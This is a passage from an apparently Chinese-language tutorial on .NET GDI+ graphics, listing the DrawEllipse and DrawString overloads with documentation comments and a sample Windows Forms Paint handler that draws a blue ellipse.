<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//&#10;&#160; &#160; &#160; &#160; //&#160;&#25688;&#35201;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#32472;&#21046;&#36793;&#30028;&#160;System.Drawing.Rectangle&#160;&#32467;&#26500;&#25351;&#23450;&#30340;&#26925;&#22278;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#21442;&#25968;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;pen:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.Pen&#65292;&#23427;&#30830;&#23450;&#26354;&#32447;&#30340;&#39068;&#33394;&#12289;&#23485;&#24230;&#21644;&#26679;&#24335;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;rect:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.Rectangle&#160;&#32467;&#26500;&#65292;&#23427;&#23450;&#20041;&#26925;&#22278;&#30340;&#36793;&#30028;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#24322;&#24120;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;System.ArgumentNullException:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;pen&#160;&#20026;&#160;null&#12290;&#10;&#160; &#160; &#160; &#160; public&#160;void&#160;DrawEllipse(Pen&#160;pen,&#160;Rectangle&#160;rect);&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#25688;&#35201;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#32472;&#21046;&#36793;&#30028;&#160;System.Drawing.RectangleF&#160;&#23450;&#20041;&#30340;&#26925;&#22278;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#21442;&#25968;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;pen:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.Pen&#65292;&#23427;&#30830;&#23450;&#26354;&#32447;&#30340;&#39068;&#33394;&#12289;&#23485;&#24230;&#21644;&#26679;&#24335;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;rect:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.RectangleF&#160;&#32467;&#26500;&#65292;&#23427;&#23450;&#20041;&#26925;&#22278;&#30340;&#36793;&#30028;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#24322;&#24120;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;System.ArgumentNullException:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;pen&#160;&#20026;&#160;null&#12290;&#10;&#160; &#160; &#160; &#160; public&#160;void&#160;DrawEllipse(Pen&#160;pen,&#160;RectangleF&#160;rect);&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#25688;&#35201;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#32472;&#21046;&#19968;&#20010;&#30001;&#36793;&#26694;&#65288;&#35813;&#36793;&#26694;&#30001;&#19968;&#23545;&#22352;&#26631;&#12289;&#39640;&#24230;&#21644;&#23485;&#24230;&#25351;&#23450;&#65289;&#23450;&#20041;&#30340;&#26925;&#22278;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#21442;&#25968;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;pen:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.Pen&#65292;&#23427;&#30830;&#23450;&#26354;&#32447;&#30340;&#39068;&#33394;&#12289;&#23485;&#24230;&#21644;&#26679;&#24335;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;x:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#23450;&#20041;&#26925;&#22278;&#30340;&#36793;&#26694;&#30340;&#24038;&#19978;&#35282;&#30340;&#160;X&#160;&#22352;&#26631;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;y:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#23450;&#20041;&#26925;&#22278;&#30340;&#36793;&#26694;&#30340;&#24038;&#19978;&#35282;&#30340;&#160;Y&#160;&#22352;&#26631;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;width:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#23450;&#20041;&#26925;&#22278;&#30340;&#36793;&#26694;&#30340;&#23485;&#24230;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;height:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#23450;&#20041;&#26925;&#22278;&#30340;&#36793;&#26694;&#30340;&#39640;&#24230;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#24322;&#24120;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;System.ArgumentNullException:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;pen&#160;&#20026;&#160;null&#12290;&#10;&#160; &#160; &#160; &#160; public&#160;void&#160;DrawEllipse(Pen&#160;pen,&#160;float&#160;x,&#160;float&#160;y,&#160;float&#160;width,&#160;float&#160;height);&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#25688;&#35201;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#32472;&#21046;&#19968;&#20010;&#30001;&#36793;&#26694;&#23450;&#20041;&#30340;&#26925;&#22278;&#65292;&#35813;&#36793;&#26694;&#30001;&#30697;&#24418;&#30340;&#24038;&#19978;&#35282;&#22352;&#26631;&#12289;&#39640;&#24230;&#21644;&#23485;&#24230;&#25351;&#23450;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#21442;&#25968;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;pen:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.Pen&#65292;&#23427;&#30830;&#23450;&#26354;&#32447;&#30340;&#39068;&#33394;&#12289;&#23485;&#24230;&#21644;&#26679;&#24335;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;x:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#23450;&#20041;&#26925;&#22278;&#30340;&#36793;&#26694;&#30340;&#24038;&#19978;&#35282;&#30340;&#160;X&#160;&#22352;&#26631;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;y:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#23450;&#20041;&#26925;&#22278;&#30340;&#36793;&#26694;&#30340;&#24038;&#19978;&#35282;&#30340;&#160;Y&#160;&#22352;&#26631;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;width:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#23450;&#20041;&#26925;&#22278;&#30340;&#36793;&#26694;&#30340;&#23485;&#24230;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;height:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#23450;&#20041;&#26925;&#22278;&#30340;&#36793;&#26694;&#30340;&#39640;&#24230;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#24322;&#24120;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;System.ArgumentNullException:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;pen&#160;&#20026;&#160;null&#12290;&#10;&#160; &#160; &#160; &#160; public&#160;void&#160;DrawEllipse(Pen&#160;pen,&#160;int&#160;x,&#160;int&#160;y,&#160;int&#160;width,&#160;int&#160;height);</span><br></pre></td></tr></table></figure>
<p>参照上面的语法定义，我们根据第一种语法，可以写出如下示例代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">///&#160;&#60;summary&#62;&#10;&#160; &#160; &#160; &#160; ///&#160;&#31383;&#20307;&#30340;Paint&#20107;&#20214;&#30340;&#21709;&#24212;&#26041;&#27861;&#10;&#160; &#160; &#160; &#160; ///&#160;&#60;/summary&#62;&#10;&#160; &#160; &#160; &#160; ///&#160;&#60;param&#160;name=&#34;sender&#34;&#62;&#24403;&#21069;&#20107;&#20214;&#35302;&#21457;&#32773;(&#24403;&#21069;&#31383;&#20307;)&#60;/param&#62;&#10;&#160; &#160; &#160; &#160; ///&#160;&#60;param&#160;name=&#34;e&#34;&#62;&#38468;&#24102;&#30340;&#20107;&#20214;&#21442;&#25968;&#60;/param&#62;&#10;&#160; &#160; &#160; &#160; private&#160;void&#160;Frm_Demo_Paint(object&#160;sender,&#160;PaintEventArgs&#160;e)&#10;&#160; &#160; &#160; &#160; &#123;&#10;&#160; &#160; &#160; &#160; &#160; &#160; Graphics&#160;graphics&#160;=&#160;e.Graphics;&#160;//&#160;&#21019;&#24314;&#24403;&#21069;&#31383;&#20307;&#30340;Graphics&#23545;&#35937;&#10;&#160; &#160; &#160; &#160; &#160; &#160; Pen&#160;pen&#160;=&#160;new&#160;Pen(Color.Blue,&#160;100);&#160;&#160;//&#160;&#21019;&#24314;&#34013;&#33394;&#160;&#31895;&#32454;&#20026;100&#30340;&#30011;&#31508;&#23545;&#35937;&#10;&#160; &#160; &#160; &#160; &#160; &#160; Rectangle&#160;rect&#160;=&#160;new&#160;Rectangle(50,&#160;50,&#160;200,&#160;100);&#160;&#160;&#160;//&#160;&#21019;&#24314;&#26925;&#22278;&#25152;&#22312;&#30340;&#30697;&#24418;&#33539;&#22260;&#10;&#160; &#160; &#160; &#160; &#160; &#160; graphics.DrawEllipse(pen,&#160;rect);&#160;&#160;&#160;&#160;//&#160;&#22312;&#25351;&#23450;&#30340;&#33539;&#22260;&#20869;&#30011;&#26925;&#22278;&#10;&#160; &#160; &#160; &#160; &#125;</span><br></pre></td></tr></table></figure>
<p>上述代码运行结果如下：</p>
<p><img src="../img/超全面的-donet-gdip-图形图像编程教程/193f7536960a32f2d724880d22e9d28b.jpg" alt=""></p>
<h3 id="4-5_输出文本">4.5 输出文本</h3><p>输出文本用到的是Graphics对象的DrawString()方法，语法定义如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//&#10;&#160; &#160; &#160; &#160; //&#160;&#25688;&#35201;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#22312;&#25351;&#23450;&#20301;&#32622;&#24182;&#19988;&#29992;&#25351;&#23450;&#30340;&#160;System.Drawing.Brush&#160;&#21644;&#160;System.Drawing.Font&#160;&#23545;&#35937;&#32472;&#21046;&#25351;&#23450;&#30340;&#25991;&#26412;&#23383;&#31526;&#20018;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#21442;&#25968;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;s:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#35201;&#32472;&#21046;&#30340;&#23383;&#31526;&#20018;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;font:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.Font&#65292;&#23427;&#23450;&#20041;&#23383;&#31526;&#20018;&#30340;&#25991;&#26412;&#26684;&#24335;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;brush:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.Brush&#65292;&#23427;&#30830;&#23450;&#25152;&#32472;&#21046;&#25991;&#26412;&#30340;&#39068;&#33394;&#21644;&#32441;&#29702;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;point:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.PointF&#160;&#32467;&#26500;&#65292;&#23427;&#25351;&#23450;&#25152;&#32472;&#21046;&#25991;&#26412;&#30340;&#24038;&#19978;&#35282;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#24322;&#24120;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;System.ArgumentNullException:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;brush&#160;&#20026;&#160;null&#12290;&#160;-&#160;&#25110;&#160;-&#160;s&#160;&#20026;&#160;null&#12290;&#10;&#160; &#160; &#160; &#160; public&#160;void&#160;DrawString(string&#160;s,&#160;Font&#160;font,&#160;Brush&#160;brush,&#160;PointF&#160;point);&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#25688;&#35201;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#22312;&#25351;&#23450;&#30697;&#24418;&#24182;&#19988;&#29992;&#25351;&#23450;&#30340;&#160;System.Drawing.Brush&#160;&#21644;&#160;System.Drawing.Font&#160;&#23545;&#35937;&#32472;&#21046;&#25351;&#23450;&#30340;&#25991;&#26412;&#23383;&#31526;&#20018;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#21442;&#25968;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;s:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#35201;&#32472;&#21046;&#30340;&#23383;&#31526;&#20018;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;font:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.Font&#65292;&#23427;&#23450;&#20041;&#23383;&#31526;&#20018;&#30340;&#25991;&#26412;&#26684;&#24335;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;brush:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.Brush&#65292;&#23427;&#30830;&#23450;&#25152;&#32472;&#21046;&#25991;&#26412;&#30340;&#39068;&#33394;&#21644;&#32441;&#29702;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;layoutRectangle:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.RectangleF&#160;&#32467;&#26500;&#65292;&#23427;&#25351;&#23450;&#25152;&#32472;&#21046;&#25991;&#26412;&#30340;&#20301;&#32622;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#24322;&#24120;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;System.ArgumentNullException:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;brush&#160;&#20026;&#160;null&#12290;&#160;-&#160;&#25110;&#160;-&#160;s&#160;&#20026;&#160;null&#12290;&#10;&#160; &#160; &#160; &#160; public&#160;void&#160;DrawString(string&#160;s,&#160;Font&#160;font,&#160;Brush&#160;brush,&#160;RectangleF&#160;layoutRectangle);&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#25688;&#35201;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#22312;&#25351;&#23450;&#20301;&#32622;&#24182;&#19988;&#29992;&#25351;&#23450;&#30340;&#160;System.Drawing.Brush&#160;&#21644;&#160;System.Drawing.Font&#160;&#23545;&#35937;&#32472;&#21046;&#25351;&#23450;&#30340;&#25991;&#26412;&#23383;&#31526;&#20018;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#21442;&#25968;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;s:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#35201;&#32472;&#21046;&#30340;&#23383;&#31526;&#20018;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;font:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.Font&#65292;&#23427;&#23450;&#20041;&#23383;&#31526;&#20018;&#30340;&#25991;&#26412;&#26684;&#24335;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;brush:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.Brush&#65292;&#23427;&#30830;&#23450;&#25152;&#32472;&#21046;&#25991;&#26412;&#30340;&#39068;&#33394;&#21644;&#32441;&#29702;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;x:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#25152;&#32472;&#21046;&#25991;&#26412;&#30340;&#24038;&#19978;&#35282;&#30340;&#160;x&#160;&#22352;&#26631;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;y:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#25152;&#32472;&#21046;&#25991;&#26412;&#30340;&#24038;&#19978;&#35282;&#30340;&#160;y&#160;&#22352;&#26631;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#24322;&#24120;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;System.ArgumentNullException:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;brush&#160;&#20026;&#160;null&#12290;&#160;-&#160;&#25110;&#160;-&#160;s&#160;&#20026;&#160;null&#12290;&#10;&#160; &#160; &#160; &#160; public&#160;void&#160;DrawString(string&#160;s,&#160;Font&#160;font,&#160;Brush&#160;brush,&#160;float&#160;x,&#160;float&#160;y);&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#25688;&#35201;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#20351;&#29992;&#25351;&#23450;&#160;System.Drawing.StringFormat&#160;&#30340;&#26684;&#24335;&#21270;&#29305;&#24615;&#65292;&#29992;&#25351;&#23450;&#30340;&#160;System.Drawing.Brush&#160;&#21644;&#160;System.Drawing.Font&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#23545;&#35937;&#22312;&#25351;&#23450;&#30340;&#20301;&#32622;&#32472;&#21046;&#25351;&#23450;&#30340;&#25991;&#26412;&#23383;&#31526;&#20018;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#21442;&#25968;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;s:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#35201;&#32472;&#21046;&#30340;&#23383;&#31526;&#20018;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;font:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.Font&#65292;&#23427;&#23450;&#20041;&#23383;&#31526;&#20018;&#30340;&#25991;&#26412;&#26684;&#24335;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;brush:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.Brush&#65292;&#23427;&#30830;&#23450;&#25152;&#32472;&#21046;&#25991;&#26412;&#30340;&#39068;&#33394;&#21644;&#32441;&#29702;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;point:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.PointF&#160;&#32467;&#26500;&#65292;&#23427;&#25351;&#23450;&#25152;&#32472;&#21046;&#25991;&#26412;&#30340;&#24038;&#19978;&#35282;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;format:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.StringFormat&#65292;&#23427;&#25351;&#23450;&#24212;&#29992;&#20110;&#25152;&#32472;&#21046;&#25991;&#26412;&#30340;&#26684;&#24335;&#21270;&#29305;&#24615;&#65288;&#22914;&#34892;&#36317;&#21644;&#23545;&#40784;&#26041;&#24335;&#65289;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#24322;&#24120;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;System.ArgumentNullException:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;brush&#160;&#20026;&#160;null&#12290;&#160;-&#160;&#25110;&#160;-&#160;s&#160;&#20026;&#160;null&#12290;&#10;&#160; &#160; &#160; &#160; public&#160;void&#160;DrawString(string&#160;s,&#160;Font&#160;font,&#160;Brush&#160;brush,&#160;PointF&#160;point,&#160;StringFormat&#160;format);&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#25688;&#35201;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#20351;&#29992;&#25351;&#23450;&#160;System.Drawing.StringFormat&#160;&#30340;&#26684;&#24335;&#21270;&#29305;&#24615;&#65292;&#29992;&#25351;&#23450;&#30340;&#160;System.Drawing.Brush&#160;&#21644;&#160;System.Drawing.Font&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#23545;&#35937;&#22312;&#25351;&#23450;&#30340;&#30697;&#24418;&#32472;&#21046;&#25351;&#23450;&#30340;&#25991;&#26412;&#23383;&#31526;&#20018;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#21442;&#25968;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;s:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#35201;&#32472;&#21046;&#30340;&#23383;&#31526;&#20018;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;font:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.Font&#65292;&#23427;&#23450;&#20041;&#23383;&#31526;&#20018;&#30340;&#25991;&#26412;&#26684;&#24335;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;brush:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.Brush&#65292;&#23427;&#30830;&#23450;&#25152;&#32472;&#21046;&#25991;&#26412;&#30340;&#39068;&#33394;&#21644;&#32441;&#29702;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;layoutRectangle:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.RectangleF&#160;&#32467;&#26500;&#65292;&#23427;&#25351;&#23450;&#25152;&#32472;&#21046;&#25991;&#26412;&#30340;&#20301;&#32622;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;format:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.StringFormat&#65292;&#23427;&#25351;&#23450;&#24212;&#29992;&#20110;&#25152;&#32472;&#21046;&#25991;&#26412;&#30340;&#26684;&#24335;&#21270;&#29305;&#24615;&#65288;&#22914;&#34892;&#36317;&#21644;&#23545;&#40784;&#26041;&#24335;&#65289;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#24322;&#24120;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;System.ArgumentNullException:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;brush&#160;&#20026;&#160;null&#12290;&#160;-&#160;&#25110;&#160;-&#160;s&#160;&#20026;&#160;null&#12290;&#10;&#160; &#160; &#160; &#160; public&#160;void&#160;DrawString(string&#160;s,&#160;Font&#160;font,&#160;Brush&#160;brush,&#160;RectangleF&#160;layoutRectangle,&#160;StringFormat&#160;format);&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#25688;&#35201;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#20351;&#29992;&#25351;&#23450;&#160;System.Drawing.StringFormat&#160;&#30340;&#26684;&#24335;&#21270;&#29305;&#24615;&#65292;&#29992;&#25351;&#23450;&#30340;&#160;System.Drawing.Brush&#160;&#21644;&#160;System.Drawing.Font&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#23545;&#35937;&#22312;&#25351;&#23450;&#30340;&#20301;&#32622;&#32472;&#21046;&#25351;&#23450;&#30340;&#25991;&#26412;&#23383;&#31526;&#20018;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#21442;&#25968;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;s:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#35201;&#32472;&#21046;&#30340;&#23383;&#31526;&#20018;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;font:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.Font&#65292;&#23427;&#23450;&#20041;&#23383;&#31526;&#20018;&#30340;&#25991;&#26412;&#26684;&#24335;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;brush:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.Brush&#65292;&#23427;&#30830;&#23450;&#25152;&#32472;&#21046;&#25991;&#26412;&#30340;&#39068;&#33394;&#21644;&#32441;&#29702;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;x:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#25152;&#32472;&#21046;&#25991;&#26412;&#30340;&#24038;&#19978;&#35282;&#30340;&#160;x&#160;&#22352;&#26631;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;y:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;&#25152;&#32472;&#21046;&#25991;&#26412;&#30340;&#24038;&#19978;&#35282;&#30340;&#160;y&#160;&#22352;&#26631;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;format:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;System.Drawing.StringFormat&#65292;&#23427;&#25351;&#23450;&#24212;&#29992;&#20110;&#25152;&#32472;&#21046;&#25991;&#26412;&#30340;&#26684;&#24335;&#21270;&#29305;&#24615;&#65288;&#22914;&#34892;&#36317;&#21644;&#23545;&#40784;&#26041;&#24335;&#65289;&#12290;&#10;&#160; &#160; &#160; &#160; //&#10;&#160; &#160; &#160; &#160; //&#160;&#24322;&#24120;:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;System.ArgumentNullException:&#10;&#160; &#160; &#160; &#160; //&#160;&#160;&#160;&#160;&#160;brush&#160;&#20026;&#160;null&#12290;&#160;-&#160;&#25110;&#160;-&#160;s&#160;&#20026;&#160;null&#12290;&#10;&#160; &#160; &#160; &#160; public&#160;void&#160;DrawString(string&#160;s,&#160;Font&#160;font,&#160;Brush&#160;brush,&#160;float&#160;x,&#160;float&#160;y,&#160;StringFormat&#160;format);</span><br></pre></td></tr></table></figure>
<p>根据上述定义，我们以 public void DrawString(string s, Font font, Brush brush, float x,float y); 语法可以写出如下示例代码：</p>
